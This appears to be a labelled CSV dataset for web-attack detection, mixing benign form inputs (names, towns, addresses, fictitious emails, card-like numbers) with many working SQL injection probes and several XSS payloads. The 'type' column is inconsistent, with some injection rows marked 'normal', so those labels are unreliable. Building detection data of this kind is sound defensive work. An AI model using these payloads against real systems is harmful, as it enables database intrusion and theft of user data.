Text,attack_type,Label,type
"1"" and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
fraser,norm,0,normal
"1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ('thce'='thce",sqli,1,sql
"1) where 5073=5073 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
40466,norm,0,normal
"-3581'||(select 'uxmh' from dual where 8954=8954 union all select 8954,8954,8954,8954,8954,8954#",sqli,1,sql
me73ga,norm,0,normal
3023,norm,0,normal
">""exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*"");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>",xss,2,sql
de asbaje abarzuza,norm,0,normal
itero de la vega,norm,0,normal
29056,norm,0,normal
godiva,norm,0,normal
"1"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",sqli,1,normal
"1) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (7182=7182",sqli,1,normal
31ena8ada,norm,0,normal
17249,norm,0,normal
mataga,norm,0,normal
marsa plomer,norm,0,normal
omura5,norm,0,normal
trooger_gereighty@quierocortinas.mil,norm,0,normal
kelland,norm,0,normal
brian,norm,0,normal
delmo,norm,0,normal
"1 where 4944=4944 union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
83,norm,0,normal
westfall,norm,0,normal
"-5845'))) union all select 3595,3595,3595,3595,3595,3595,3595,3595,3595#",sqli,1,sql
32520,norm,0,normal
simat de la valldigna,norm,0,normal
1370,norm,0,normal
kantorkova@salaparis.je,norm,0,normal
"-1<img dynsrc=""javascript:document.cookie=true;"">",xss,2,xss
1') waitfor delay '0:0:5' and ('vtfs'='vtfs,sqli,1,normal
02629071x,norm,0,normal
3581640568970302,norm,0,normal
boynton4,norm,0,normal
e46ola5,norm,0,normal
"1"";select sleep(5) and ""irxg""=""irxg",sqli,1,sql
"c/ los rosales 166, 6f",norm,0,normal
neil,norm,0,normal
alvaro-pagano@hiperpapel.an,norm,0,normal
"1"")) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""rqxd""=""rqxd",sqli,1,sql
1'))) and (select * from (select(sleep(5)))fzno) and ((('acml' like 'acml,sqli,1,sql
69054908f,norm,0,normal
72799603a,norm,0,normal
nerpio,norm,0,normal
kagioglu almendro,norm,0,normal
co*marca,norm,0,normal
1')) as dckd where 1794=1794;select (case when (2914=3335) then 2914 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
gdor,norm,0,normal
19185,norm,0,normal
terland-bartha5@informatica2009.ck,norm,0,normal
"-6618""))) order by 1#",sqli,1,normal
sennett@ankawaelda.tr,norm,0,normal
completorio,norm,0,normal
7a7i86,norm,0,normal
"1') where 8586=8586 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
gaftea,norm,0,normal
"1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ('nopu'='nopu",sqli,1,sql
"1"" or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",sqli,1,sql
33423,norm,0,normal
"1') as mmhe where 2142=2142 or 8466=benchmark(5000000,md5(0x694a4745))--",sqli,1,sql
"1) where 9206=9206 union all select null,null,null,null,null,null#",sqli,1,sql
chojuacka@google-movil.eg,norm,0,normal
"1""))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (((""mmsh""=""mmsh",sqli,1,sql
1';select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
"1"")) union all select null,null,null,null,null#",sqli,1,sql
"<iframe src=""javascript:document.cookie=true;""></iframe>",xss,2,xss
"1"")) as ccjk where 1932=1932 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"1"" or sleep(5) and ""fbuo"" like ""fbuo",sqli,1,normal
1'+(select 'iqxn' where 1146=1146 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))+',sqli,1,sql
bartush,norm,0,normal
06208,norm,0,normal
staci,norm,0,normal
grgar8,norm,0,normal
"1 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- viti",sqli,1,sql
es3regamiento,norm,0,normal
swanson@sexl.co,norm,0,normal
7512207991188731,norm,0,normal
maryak,norm,0,normal
"<body onload=""document.cookie=true;"">",xss,2,xss
1'+(select 'hplm' where 4008=4008 and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
8179154437661538,norm,0,normal
autoritariamente,norm,0,normal
dudarova@automoviles-hibridos.ag,norm,0,normal
"c/ julia minguillon, 179, 7-a",norm,0,normal
"1'+(select 'lawc' where 1171=1171 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
urdua-ordua,norm,0,normal
"1"") as giqb where 4664=4664;select case when 7717=7717 then 1 else null end--",sqli,1,sql
"(extractvalue(1759,concat(0x5c,0x7171706a71,(select (elt(1759=1759,1))),0x717a767a71)))",sqli,1,sql
"1%""))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""%""=""",sqli,1,normal
cazalegas,norm,0,normal
6622,norm,0,normal
"1);select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
ab1orbencia,norm,0,normal
buenda,norm,0,normal
"-4285'))) union all select 8819,8819,8819,8819,8819,8819,8819,8819#",sqli,1,sql
1'+(select 'luhy' where 3112=3112 and (3020=3020)*6703)+',sqli,1,sql
imokoude@transportesvegasl.et,norm,0,normal
"1'+(select 'zirh' where 9054=9054 and 3824=benchmark(5000000,md5(0x76555642)))+'",sqli,1,sql
"1"" or elt(6272=6272,sleep(5))",sqli,1,normal
17861,norm,0,normal
6424,norm,0,normal
38747118f,norm,0,normal
elda,norm,0,normal
valencia de don juan,norm,0,normal
de4f1g6raci4,norm,0,normal
haim.gorvin@didacramirez.tl,norm,0,normal
8529,norm,0,normal
1613,norm,0,normal
tobias5,norm,0,normal
"-4513""))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""gytb""=""gytb",sqli,1,sql
"1""))) and 4967=8866 and (((""jzyn"" like ""jzyn",sqli,1,normal
1;if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
22468230j,norm,0,normal
fuchs.keres@cpanelweb.tel,norm,0,normal
"-6307' where 8916=8916 union all select 8916,8916,8916,8916,8916,8916,8916--",sqli,1,sql
mazursky@mundo-deportivo.mx,norm,0,normal
"1"" or (select * from (select(sleep(5)))ydpu)",sqli,1,sql
04681808c,norm,0,normal
"travesia castilla, 92, 5-g",norm,0,normal
mathius,norm,0,normal
seblcor,norm,0,normal
"c/ l' or, 125",norm,0,normal
elementada,norm,0,normal
1%');begin dbms_lock.sleep(5); end--,sqli,1,sql
"-3710)) union all select 5770,5770,5770,5770,5770,5770,5770#",sqli,1,sql
navalperal de pinares,norm,0,normal
09315,norm,0,normal
nilda@nightflight.ec,norm,0,normal
banderizar,norm,0,normal
"1 where 4949=4949;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"1"" where 5477=5477;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
"1%"")));iif(5257=5257,1,1/0)",sqli,1,sql
"1' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",sqli,1,sql
"1"" and make_set(6520=9958,9958)",sqli,1,normal
castil de peones,norm,0,normal
tr99ma,norm,0,normal
morcn,norm,0,normal
82301478a,norm,0,normal
duenas,norm,0,normal
karin,norm,0,normal
5818,norm,0,normal
"1""))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""blkt"" like ""blkt",sqli,1,sql
"1%')) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
triggian,norm,0,normal
50259,norm,0,normal
agelet grenett,norm,0,normal
73spojador,norm,0,normal
roth,norm,0,normal
"1"")));select count(*) from generate_series(1,5000000)--",sqli,1,sql
"<t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>alert(""crosssitescripting"")</script>"">",xss,2,xss
medel pujolriu,norm,0,normal
"-8477' union all select 2517,2517,2517--",sqli,1,sql
7855531412363120,norm,0,normal
1 where 7038=7038;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
haiping,norm,0,normal
laneuville@hangarcentrodelautomovil.sh,norm,0,normal
probtica,norm,0,normal
"travesia calleja encina, 199 11?d",norm,0,normal
pineda trasmonte,norm,0,normal
co2posi9or,norm,0,normal
"1"")) as ngvf where 9912=9912 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
gussi,norm,0,normal
1'));select (case when (3365=6236) then 3365 else 1/(select 0) end)--,sqli,1,sql
-1485') or (2056=4008)*4008 and ('vphj'='vphj,sqli,1,normal
"1%"")) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""%""=""",sqli,1,normal
"1' in boolean mode) union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1%"" and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
romn,norm,0,normal
benji,norm,0,normal
plza. euzkaltzandia 56 2-b,norm,0,normal
6144372823408043,norm,0,normal
58265705n,norm,0,normal
9849,norm,0,normal
condensativo,norm,0,normal
"1')) as xrre where 1172=1172 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1,sql
"1"") where 2312=2312 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
saya,norm,0,normal
iznate,norm,0,normal
corencia_beranger@100mbps.is,norm,0,normal
7418312492112403,norm,0,normal
3872,norm,0,normal
0212404020033772,norm,0,normal
inusitado,norm,0,normal
soms gallaga,norm,0,normal
serrtil,norm,0,normal
96269598q,norm,0,normal
rozin,norm,0,normal
62257757t,norm,0,normal
"estao, 92 4?c",norm,0,normal
saldas,norm,0,normal
95866747x,norm,0,normal
"1' union all select null,null,null,null,null,null,null,null#",sqli,1,sql
leftwich@sms24h.sb,norm,0,normal
"c/ huertas altas, 114",norm,0,normal
"1"")));select count(*) from generate_series(1,5000000) and (((""uydm""=""uydm",sqli,1,sql
"-4983%"") or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""%""=""",sqli,1,sql
rogan-darrieux@rocofer.tc,norm,0,normal
0029687955884916,norm,0,normal
belito cedeo,norm,0,normal
"c/ xeixa, 189 8?d",norm,0,normal
"-8810') or make_set(9354=9354,7185) and ('prsn' like 'prsn",sqli,1,normal
47315,norm,0,normal
"1%' union all select null,null,null,null,null,null,null,null#",sqli,1,sql
68266885x,norm,0,normal
"1'+(select 'aliz' where 5050=5050 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))+'",sqli,1,sql
1%'));waitfor delay '0:0:5'--,sqli,1,sql
malditamente,norm,0,normal
al8grar,norm,0,normal
"muela, la",norm,0,normal
castejn,norm,0,normal
"1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and 'aicu'='aicu",sqli,1,sql
"1"";select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3",sqli,1,sql
50619,norm,0,normal
lava,norm,0,normal
-2707'))) or (8459=8459)*4906 and ((('mwdq'='mwdq,sqli,1,normal
"c/ albaida, 165, 2-a",norm,0,normal
florez,norm,0,normal
1' where 1017=1017 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1,sql
"calle joaquin gamon 175, 2-c",norm,0,normal
"1%"" and 6408=7959--",sqli,1,sql
-4248 where 3288=3288 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,1,sql
wanisko_hoover@tradora.td,norm,0,normal
6429,norm,0,normal
6361616963861942,norm,0,normal
leiding@ubuybetter.cat,norm,0,normal
"1"" union all select null,null,null,null,null,null#",sqli,1,sql
"1"")) as hdyn where 6027=6027 union all select null,null,null--",sqli,1,sql
"1')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('nlnk' like 'nlnk",sqli,1,sql
siurana,norm,0,normal
"-5998"") as gazd where 2814=2814 union all select 2814,2814,2814,2814,2814,2814,2814--",sqli,1,sql
engolfar,norm,0,normal
"1 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
05580,norm,0,normal
serpiginoso,norm,0,normal
huari,norm,0,normal
atanasio,norm,0,normal
abarrategui allende,norm,0,normal
"1' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'vgro' like 'vgro",sqli,1,sql
valdemaluque,norm,0,normal
5399041434530750,norm,0,normal
romana,norm,0,normal
c/ costa i llobera 83,norm,0,normal
"1') where 6772=6772 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",sqli,1,sql
88280590n,norm,0,normal
wedel@wormee.de,norm,0,normal
"calle conesa balanza 138, 9?c",norm,0,normal
1' and sleep(5) and 'kapr'='kapr,sqli,1,normal
azcrate campalan,norm,0,normal
c2lea,norm,0,normal
47220,norm,0,normal
trespaderne,norm,0,normal
"1"") where 8702=8702 union all select null,null,null,null,null--",sqli,1,sql
macdowal,norm,0,normal
71611234k,norm,0,normal
"1) as oblq where 2002=2002 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",sqli,1,sql
"1'+(select inrv where 2178=2178 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"1%"" and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
banchieri romaguer,norm,0,normal
"1"" where 4597=4597 rlike sleep(5)--",sqli,1,sql
"1%""))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (((""%""=""",sqli,1,normal
17452,norm,0,normal
2993,norm,0,normal
pinilla de los barruecos,norm,0,normal
dantas.pellegrim4@nanotecnologo.kr,norm,0,normal
"-8982'+(select anyd where 5358=5358 union all select 5358,5358,5358,5358,5358,5358#",sqli,1,sql
i5sepulta,norm,0,normal
"-9046')) as ymqc where 3733=3733 union all select 3733,3733,3733,3733,3733,3733,3733--",sqli,1,sql
"calle molin el toro 28,",norm,0,normal
1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'ixzr'='ixzr,sqli,1,sql
jehovah,norm,0,normal
glvez matons,norm,0,normal
"c/ el columpio 13,",norm,0,normal
"1%"" and 3824=benchmark(5000000,md5(0x76555642)) and ""%""=""",sqli,1,normal
"1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and 'usnh' like 'usnh",sqli,1,sql
"1' where 7125=7125 or elt(6272=6272,sleep(5))--",sqli,1,sql
"1') union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
aminta,norm,0,normal
baln,norm,0,normal
93640511j,norm,0,normal
macdougall_laurier@rocofer.am,norm,0,normal
"1')) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (('bdsq' like 'bdsq",sqli,1,normal
"glorieta emperador carlos v, 88 2-h",norm,0,normal
"barriada de la virgen del valle, 178 2-f",norm,0,normal
"colon 111, 13-c",norm,0,normal
desi4teresal,norm,0,normal
34878590x,norm,0,normal
frank@soymuyguapa.tn,norm,0,normal
zarrabia,norm,0,normal
-6616) order by 1--,sqli,1,sql
1;waitfor delay '0:0:5'-- thuo,sqli,1,sql
1') rlike (select (case when (2671=4485) then 1 else 0x28 end)) and ('ezco' like 'ezco,sqli,1,sql
winningt,norm,0,normal
-2992%'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('%'=',sqli,1,sql
"viso de san juan, el",norm,0,normal
02877417w,norm,0,normal
rev2elaci3,norm,0,normal
travessera muntanya 27,norm,0,normal
9a470ul0,norm,0,normal
8460,norm,0,normal
"1"") as buky where 7898=7898 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1%');iif(9134=5736,1,1/0)",sqli,1,sql
exigidad,norm,0,normal
"1' where 5060=5060;select count(*) from generate_series(1,5000000)--",sqli,1,sql
maurino,norm,0,normal
1)) rlike sleep(5)#,sqli,1,normal
jane@23horas.ua,norm,0,normal
"1')) as tfub where 3461=3461 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
161que,norm,0,normal
almaluez,norm,0,normal
pifarre marola,norm,0,normal
de2ape91ibi1ie4to,norm,0,normal
wilfredo,norm,0,normal
lemin@11horas.mz,norm,0,normal
chao-pin2,norm,0,normal
pavor,norm,0,normal
-5134))) or 8571=8571--,sqli,1,sql
tomi,norm,0,normal
"-1668""))) or 9323=9323#",sqli,1,normal
"1%')) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('%'='",sqli,1,sql
infida,norm,0,normal
"1%"")));select * from generate_series(9964,9964,case when (9964=4455) then 1 else 0 end) limit 1--",sqli,1,sql
1);select (case when (6435=8988) then 6435 else 6435*(select 6435 from information_schema.character_sets) end)#,sqli,1,sql
96to3a38,norm,0,normal
05684753g,norm,0,normal
caminreal,norm,0,normal
"calle alhondiga, 103, 12d",norm,0,normal
"1"") as fgne where 7207=7207;select pg_sleep(5)--",sqli,1,sql
desvanecido,norm,0,normal
"-1083') union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",sqli,1,sql
"(select (case when (3531=3531) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else 3531 end))",sqli,1,sql
"1'+(select ttae where 4601=4601 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5))+'",sqli,1,sql
warriner,norm,0,normal
"1""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((""sfnj"" like ""sfnj",sqli,1,sql
"-7568""))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""jxge"" like ""jxge",sqli,1,sql
45840,norm,0,normal
min81t8,norm,0,normal
<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>,xss,2,xss
atendedor,norm,0,normal
fong,norm,0,normal
1525,norm,0,normal
8512064056348280,norm,0,normal
r3i8a83nt1,norm,0,normal
maren-bufford4@fruteriacartaya.yu,norm,0,normal
"1%');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
vilaprio,norm,0,normal
"1"")) as tfjh where 1134=1134 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
thain,norm,0,normal
"1 where 5485=5485 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
klee8@farma-job.fj,norm,0,normal
monopolizador,norm,0,normal
"1""))) or sleep(5) and (((""hdis"" like ""hdis",sqli,1,normal
1 or sleep(5)-- nrzf,sqli,1,sql
casasola de arin,norm,0,normal
llanes,norm,0,normal
"1'||(select 'hvqw' from dual where 4423=4423 union all select null,null,null--",sqli,1,sql
wido,norm,0,normal
mary-ell,norm,0,normal
ubaldino,norm,0,normal
12810,norm,0,normal
prosdcimo surinyac,norm,0,normal
samuel,norm,0,normal
28820,norm,0,normal
"1"") as ztkr where 1532=1532;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli,1,sql
polesello@tantomontamontatanto.int,norm,0,normal
"1') as ssez where 5351=5351 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
"el naranjo, s/n 5f",norm,0,normal
ferra,norm,0,normal
ynes,norm,0,normal
"1"" where 9804=9804 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
37130,norm,0,normal
5525531016614315,norm,0,normal
"1'))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('tzrd'='tzrd",sqli,1,normal
8623,norm,0,normal
0713886795207226,norm,0,normal
"1')) as kpdl where 4443=4443 union all select null,null,null,null,null,null--",sqli,1,sql
galdino,norm,0,normal
-5229')) as tkqp where 9253=9253 or 9323=9323#,sqli,1,normal
cerna sennacherribbo,norm,0,normal
14835707v,norm,0,normal
thomaier,norm,0,normal
89393853y,norm,0,normal
2839,norm,0,normal
64575959d,norm,0,normal
meeks,norm,0,normal
9490117587717675,norm,0,normal
"1"" and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
<scr<script>ipt>alert(1)</scr<script>ipt>,xss,2,xss
jon,norm,0,normal
nicasio,norm,0,normal
1')));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
verschuer_greenleaf@cajucar.cx,norm,0,normal
"1' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'yfkk'='yfkk",sqli,1,sql
"c/ bernat y baldovi, 32 6-g",norm,0,normal
"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",sqli,1,sql
"repeso 27,",norm,0,normal
"quintana 19, 13f",norm,0,normal
0om7rera,norm,0,normal
91394785f,norm,0,normal
"infantes de carrion, 122",norm,0,normal
65281809n,norm,0,normal
"1') where 7093=7093 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
86535075j,norm,0,normal
-8911%' or 9323=9323#,sqli,1,normal
castillonuevo,norm,0,normal
kuneva_germaine@ajuntamentdebcn2-0.cy,norm,0,normal
"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('hfxu' like 'hfxu",sqli,1,sql
93tip72ar,norm,0,normal
1') rlike (select * from (select(sleep(5)))sgvo),sqli,1,sql
calle junco,norm,0,normal
"1)) as eigk where 2557=2557;select count(*) from generate_series(1,5000000)--",sqli,1,sql
"1 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)-- ivku",sqli,1,sql
39696,norm,0,normal
"1) and elt(3114=3114,sleep(5))#",sqli,1,normal
"1'+(select vvet where 5221=5221 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))+'",sqli,1,sql
11140,norm,0,normal
"1))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
a6e7i519374n,norm,0,normal
"1)) as gcvw where 7363=7363 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",sqli,1,sql
"1 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)-- ztzu",sqli,1,sql
sanchon vilavend,norm,0,normal
castarle chiroboga,norm,0,normal
92frico,norm,0,normal
canellas redolad,norm,0,normal
1');select (case when (7217=7631) then 7217 else 7217*(select 7217 from information_schema.character_sets) end)#,sqli,1,sql
"isla de nelson, 89 7?h",norm,0,normal
45130,norm,0,normal
75u1al3e,norm,0,normal
v2e2udo,norm,0,normal
coclea!ria,norm,0,normal
"1'+(select emeu where 2310=2310;select * from generate_series(1134,1134,case when (1134=4909) then 1 else 0 end) limit 1--",sqli,1,sql
28287163s,norm,0,normal
bellveh badrenas,norm,0,normal
6107572427974464,norm,0,normal
1%' and (3020=3020)*6703 and '%'=',sqli,1,normal
ordezanka@arroyo-molinos.dj,norm,0,normal
"1"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",sqli,1,sql
tomkin,norm,0,normal
gomska.hopper@ebuy.com.bi,norm,0,normal
gorecka-fosser@peaf.sl,norm,0,normal
lightner.manor@rosaserigrafia.as,norm,0,normal
dennis,norm,0,normal
"1') where 2121=2121 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
keen,norm,0,normal
"c/ pintor camaron, 88, 9?g",norm,0,normal
cajahuanca barberan,norm,0,normal
"aldea, l'",norm,0,normal
moyse_desica8@cursosdele.rw,norm,0,normal
llosa coa,norm,0,normal
1' and (5116=1602)*1602,sqli,1,normal
creyente,norm,0,normal
steen@necesitouncredito.vu,norm,0,normal
birk2,norm,0,normal
75261065m,norm,0,normal
"calle caballeros, 160, 3-b",norm,0,normal
livermore-kozlowski@hiteurope.ws,norm,0,normal
19338,norm,0,normal
50374,norm,0,normal
neetu,norm,0,normal
83154874f,norm,0,normal
olascoaga huix,norm,0,normal
9678,norm,0,normal
2955362833372766,norm,0,normal
-8409)) as ipbz where 9984=9984 or 3371=3869,sqli,1,normal
59560161m,norm,0,normal
"-1<div style=""binding: url([link to code]);"">",xss,2,sql
"fierro 66, 3?e",norm,0,normal
quijar,norm,0,normal
